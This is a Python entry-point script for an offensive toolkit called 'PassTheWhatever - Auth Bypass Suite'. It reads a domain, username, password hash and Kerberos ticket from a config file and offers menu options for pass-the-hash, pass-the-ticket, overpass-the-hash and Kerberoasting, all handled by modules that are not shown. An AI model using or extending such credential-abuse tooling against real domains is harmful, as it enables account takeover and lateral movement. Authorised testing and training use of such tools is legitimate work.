import yaml
from colorama import init, Fore
from modules import pth, ptt, kerberoast, opth

init(autoreset=True)

def main():
    print(Fore.GREEN + "[+] PassTheWhatever - Auth Bypass Suite")
    with open("config/config.yml") as f:
        config = yaml.safe_load(f)

    while True:
        print(Fore.BLUE + "\n(1) Pass-the-Hash")
        print("(2) Pass-the-Ticket")
        print("(3) Overpass-the-Hash")
        print("(4) Kerberoasting Simulation")
        print("(5) Exit")
        choice = input("> ").strip()

        if choice == "1":
            target = input("Target hostname/IP: ").strip()
            pth.pass_the_hash(config["domain"], config["username"], config["hash"], target)
        elif choice == "2":
            ptt.pass_the_ticket(config["kerberos_ticket"])
        elif choice == "3":
            opth.overpass_the_hash(config["domain"], config["username"], config["hash"])
        elif choice == "4":
            kerberoast.simulate_kerberoasting(config["domain"], config["username"], "Password123!")
        elif choice == "5":
            break
        else:
            print(Fore.RED + "Invalid choice.")

if __name__ == "__main__":
    main()
